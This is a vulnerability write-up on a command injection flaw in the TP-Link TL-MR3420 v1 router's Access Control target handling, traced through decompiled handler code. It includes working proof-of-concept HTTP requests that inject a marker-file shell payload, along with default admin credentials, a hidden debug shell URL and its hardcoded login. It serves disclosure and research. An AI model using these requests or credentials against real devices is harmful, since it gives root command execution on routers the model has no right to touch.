# Command Injection Vulnerability in TP-Link TL-MR3420 v1 Access Control Target Configuration

## Overview

  * Vendor: TP-Link
  * Product: TL-MR3420
  * Hardware Version: MR3420 v1
  * Tested Firmware Version: `3.12.3 Build 110222 Rel.34500n Beta`
  * Vulnerability Type: Authenticated Command Injection
  * Affected Component: `httpd` Web Management Interface
  * Affected Pages:
    * `/userRpm/AccessCtrlAccessTargetsRpm.htm`
    * `/userRpm/AccessCtrlAccessRulesRpm.htm`
  * Trigger Parameter: `url_0` in the Access Control target configuration
  * Default Web Credential Used in Testing: `admin / admin`
  * Impact: Remote command execution with the privilege of the `httpd` process, which is typically root on this device.

## Vulnerability Basic Information

  * Target Configuration Handler: `AccessTargetsRpmHtm`
  * Rule Configuration Handler: `AccessRulesRpmHtm`
  * Domain Validation Function: `swChkLegalDomain`
  * Target Save Function: `swSetAccessTargetsEntry`
  * Global Access Control Function: `ucSetAccessCtrlGlobalCfg`
  * Rule Refresh and Execution Function: `refreshAccessCtrlTbl`
  * Generated Shell Script: `/tmp/wr841n/accessCtrl.sh`
  * Final Execution Point: `system("sh /tmp/wr841n/accessCtrl.sh")`
  * Prerequisites:
    * The attacker has valid access to the router Web management interface.
    * The attacker can create an Access Control target in website/domain mode.
    * The attacker can create or update an Access Control rule that references the crafted target.
    * Access Control is enabled or refreshed, causing `refreshAccessCtrlTbl` to regenerate and execute the access control script.

## Vulnerability Description

The Access Control target configuration page accepts website/domain target entries through parameters such as `url_0`, `url_1`, `url_2`, and `url_3`. The backend validation function `swChkLegalDomain` allows shell metacharacters including `;`, `>`, `#`, backticks, `$`, `&`, and spaces. As a result, a crafted domain string can be stored in the Access Control target table.

When an Access Control rule references this target and the Access Control table is refreshed, `refreshAccessCtrlTbl` retrieves the saved target, inserts the domain list into iptables command strings with an unquoted `%s`, writes the commands into `/tmp/wr841n/accessCtrl.sh`, and finally executes the generated script through `system()`. Because the stored domain value is not shell-escaped, an authenticated attacker can inject commands through the Access Control target domain field.

## URL Mapping and Handler Discovery

The `/userRpm/AccessCtrlAccessTargetsRpm.htm` endpoint can be found from the IDA Strings window by searching for `AccessCtrlAccessTargetsRpm`.
<img width="1047" height="306" alt="image" src="https://github.com/user-attachments/assets/3c74fabb-ab25-4337-bad0-930ea05135cf" />


The string cross references point to the Access Control target handling functions. The relevant request handler for saving Access Control targets is `AccessTargetsRpmHtm`.

<img width="1572" height="273" alt="image" src="https://github.com/user-attachments/assets/6f5c3e7b-d96f-40a8-8c3b-beaec2a00c59" />


## Parameter Input and Storage

When saving an Access Control target, `AccessTargetsRpmHtm` reads `target_type`. A value of `0` represents website/domain target mode. In this mode, the handler loops over `url_0` through `url_3`, retrieves each value with `httpGetEnv`, validates it with `swChkLegalDomain`, and stores it with `strncpy`.

```c
s_[1] = getEnvToInt(a1, "target_type", 0, 1);
v18 = s_[1];
src = (const char *)httpGetEnv(a1, "targets_lists_name");
if ( src )
{
  HIBYTE(s_[8]) = 0;
  strncpy((char *)&s_[2], src, 0x18u);
}

if ( v18 )
  goto LABEL_53;

n4_1 = 0;
dest = (char *)&s_[12] + 2;

while ( 1 )
{
  sprintf(s, "url_%d", n4_1);
  s_4 = (char *)httpGetEnv(a1, s);
  s_3 = s_4;
  if ( s_4 )
    break;
LABEL_52:
  ++n4_1;
  v34 += 31;
  dest += 31;
  if ( n4_1 == 4 )
    goto LABEL_54;
}
```

After validation succeeds, the input is copied into the Access Control target structure and saved.

```c
if ( swChkLegalDomain(s_3) )
{
  *((_BYTE *)&v62 + v34 + 424) = 0;
  strncpy(dest, s_3, 0x1Eu);
  goto LABEL_52;
}

...

sEntry = swSetAccessTargetsEntry(s_);
```

## Insufficient Validation

The `swChkLegalDomain` function uses a permissive character set. The allowed set includes shell metacharacters that should not be accepted when the value may later be inserted into a shell script.

<img width="1389" height="1197" alt="image" src="https://github.com/user-attachments/assets/a0412bbe-9a3b-4488-86b8-6e71bde9ebbb" />


The relevant allowed character set is:

```c
"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
"-><.,[]{}?/+=|\\'\":;~!#$%()` &"
```

For example, the following value is accepted by the backend domain validation logic:

```sh
;echo acct>/tmp/acct;#
```

The browser-side JavaScript validation may display an error for illegal characters, but the backend accepts the same value when the request is sent directly to the handler.

The target save path lowercases website/domain target entries and then stores the structure through `ucSetAccessTargetsEntry`. No additional shell metacharacter filtering is applied.

<img width="975" height="1209" alt="image" src="https://github.com/user-attachments/assets/0af30844-5d4a-4b69-bf23-94e25d3c9a53" />


```c
if ( *((_DWORD *)s1 + 1) != 1 )
{
  v9 = s1;
  for ( n3 = 3; n3 >= 0; --n3 )
  {
    v11 = v9[50];
    v12 = (char *)(v9 + 50);
    s = (const char *)(v9 + 50);
    v9 += 31;
    if ( v11 )
    {
      v14 = strlen(s);
      swToLowerCase(v12, v14);
    }
  }
  return ucSetAccessTargetsEntry(s1);
}
```

## Rule Reference and Refresh Trigger

The malicious Access Control target must be referenced by an Access Control rule. In `AccessRulesRpmHtm`, the rule save branch reads `targets_lists` from the HTTP request and stores it in the rule structure.

```c
if ( httpGetEnv(a1, "Save") )
{
  memset(s_, 0, 0x2Cu);
  s_[0] = 1;
  src = (const char *)httpGetEnv(a1, "rule_name");
  if ( src )
  {
    HIBYTE(s_[10]) = 0;
    strncpy((char *)&s_[4], src, 0x18u);
  }

  BYTE1(s_[10]) = getEnvToInt(a1, "hosts_lists", 0, 255);
  BYTE2(s_[10]) = getEnvToInt(a1, "targets_lists", 0, 255);
  LOBYTE(s_[10]) = getEnvToInt(a1, "scheds_lists", 0, 255);
  s_[2] = getEnvToInt(a1, "allow", 0, 1);
  s_[1] = getEnvToInt(a1, "enable", 0, 1);

  v20 = swSetAccessRulesEntry(s_, n9_1, v25, 1);
}
```

The same handler also processes the global Access Control switch. When `enableCtrl` is provided, it calls `swSetAccessCtrlGlobalCfg`.

```c
EnvToInt_2 = getEnvToInt(a1, "enableCtrl", 0, 1);
if ( EnvToInt_2 != -128 )
{
  EnvToInt_3 = EnvToInt_2;
  EnvToInt_4 = getEnvToInt(a1, "defRule", 0, 1);
  swSetAccessCtrlGlobalCfg((int)&EnvToInt_3);
}
```

`ucSetAccessCtrlGlobalCfg` saves the global configuration and calls `refreshAccessCtrlTbl`, which is the function that regenerates and executes the Access Control shell script.

<img width="950" height="699" alt="image" src="https://github.com/user-attachments/assets/e226e153-d25a-4dea-88fb-2790fb93b401" />


```c
if ( memcmp(p_EnvToInt, (const void *)::ucAccessCtrlGlobalCfg, 8u) )
{
  if ( v2 != *p_EnvToInt )
  {
    *ucAccessCtrlGlobalCfg = *p_EnvToInt;
    ipt_ForwardUpdate();
  }

  *(_DWORD *)(::ucAccessCtrlGlobalCfg + 4) = p_EnvToInt[1];
  usrconf_save();
  refreshAccessCtrlTbl(ucAccessCtrlRulesTable);
}
```

## Command Construction and Execution

`refreshAccessCtrlTbl` opens `/tmp/wr841n/accessCtrl.sh` and writes iptables rules into it.

```c
*(_DWORD *)filterScriptFile = fopen("/tmp/wr841n/accessCtrl.sh", "wt");
fputs("iptables -F FORWARD_ACCESSCTRL\n", *(FILE **)filterScriptFile);
```

While iterating over enabled Access Control rules, the function retrieves the referenced Access Control target. The byte at `v4 + 46` corresponds to the `targets_lists` value stored in the rule.

```c
ucGetLanHostsEntry(*(unsigned __int8 *)(v4 + 45), v48);
n255 = *(unsigned __int8 *)(v4 + 46);
if ( n255 != 255 )
  ucGetAccessTargetsEntry(n255, v53);
```

For website/domain targets, the stored URL entries are concatenated into `s__3`. In this branch, `v60` holds the target URL list and `s__3` becomes the string later inserted into the shell script.

```c
memset(s__3, 0, sizeof(s__3));
v19 = 0;
for ( n3 = 3; n3 >= 0; --n3 )
{
  if ( s[v19 + 1154] )
  {
    v21 = strlen(s__3);
    sprintf(&s__3[v21], "%s,", &v60[v19]);
  }
  v19 += 31;
}
```

The vulnerable command construction uses `s__3` directly with an unquoted `%s`.

```c
sprintf(s_1, "-p tcp --dport 80 -m multiurl --urls %s ", s__3);
fprintf(*(FILE **)filterScriptFile, "%s\n", s);
```

The DNS matching branch has the same issue.

```c
sprintf(s_1,
        "-p udp --dport 53 -m string --string %s --from %d --algo %s ",
        s__3,
        40,
        "kmp");
fprintf(*(FILE **)filterScriptFile, "%s\n", s);
```

Finally, the generated script is executed with `system()`.

```c
fclose(stream);
return system("sh /tmp/wr841n/accessCtrl.sh");
```

## The Complete Data Flow

```text
/userRpm/AccessCtrlAccessTargetsRpm.htm
  -> AccessTargetsRpmHtm
     -> httpGetEnv("url_0")
     -> swChkLegalDomain() allows shell metacharacters
     -> strncpy(dest, url_0, 0x1e)
     -> swSetAccessTargetsEntry()
     -> ucSetAccessTargetsEntry()
     -> saved in ucAccessTargetsTable

/userRpm/AccessCtrlAccessRulesRpm.htm
  -> AccessRulesRpmHtm
     -> httpGetEnv("targets_lists")
     -> swSetAccessRulesEntry()
     -> the rule references the crafted target

/userRpm/AccessCtrlAccessRulesRpm.htm?enableCtrl=1&defRule=1
  -> AccessRulesRpmHtm
     -> swSetAccessCtrlGlobalCfg()
     -> ucSetAccessCtrlGlobalCfg()
     -> refreshAccessCtrlTbl()

refreshAccessCtrlTbl()
  -> ucGetAccessTargetsEntry(targets_lists, ...)
  -> sprintf(... "--urls %s", urlList)
  -> fprintf("/tmp/wr841n/accessCtrl.sh", ...)
  -> system("sh /tmp/wr841n/accessCtrl.sh")
```

## Verification Notes

The issue was verified on a physical TL-MR3420 v1 device at `192.168.1.1`. The two Web management endpoints involved in the vulnerable path were:

```text
Access Control target configuration:
http://192.168.1.1/userRpm/AccessCtrlAccessTargetsRpm.htm

Access Control rule configuration:
http://192.168.1.1/userRpm/AccessCtrlAccessRulesRpm.htm
```

The two trigger requests used during verification were:

```text
1. Save the crafted Access Control target:
http://192.168.1.1/userRpm/AccessCtrlAccessTargetsRpm.htm?Save=Save&target_type=0&targets_lists_name=acct&url_0=%3Becho%20acct%3E%2Ftmp%2Facct%3B%23&url_1=&url_2=&url_3=&Changed=0&SelIndex=0&Page=1

2. Save an Access Control rule that references the crafted target:
http://192.168.1.1/userRpm/AccessCtrlAccessRulesRpm.htm?Save=Save&rule_name=acctrule&hosts_lists=255&targets_lists=0&scheds_lists=255&allow=0&enable=1&Changed=0&SelIndex=0&Page=1
```

After these two requests, enabling Access Control refreshes the table and executes the generated script:

```text
http://192.168.1.1/userRpm/AccessCtrlAccessRulesRpm.htm?enableCtrl=1&defRule=1&Page=1
```

The hidden debug shell page was used only to confirm command execution and inspect temporary runtime state:

```text
Hidden debug shell page:
http://192.168.1.1/userRpmNatDebugRpm26525557/linux_cmdline.html
```

The Web management interface requires the router administrator credential:

```text
Username: admin
Password: admin
```

The hidden debug shell uses a separate hardcoded credential:

```text
Username: osteam
Password: 5up
```

During verification, a website/domain target entry was created with a marker-file payload in `url_0`. A rule was then created with `targets_lists=0`, referencing the crafted target. Enabling Access Control triggered `refreshAccessCtrlTbl`, and the marker file was observed through the hidden debug shell.
<img width="1980" height="462" alt="image" src="https://github.com/user-attachments/assets/2b2dc511-874e-4127-b1ba-e8a9dfb4277f" />


## Conclusion

The TP-Link TL-MR3420 v1 firmware `3.12.3 Build 110222 Rel.34500n Beta` contains an authenticated command injection vulnerability in the Access Control target handling path. The backend accepts shell metacharacters in website/domain Access Control targets, stores the value, later inserts it into an unquoted shell script command, and executes the generated script through `system()`. An authenticated attacker can use this flaw to execute arbitrary commands on the router.
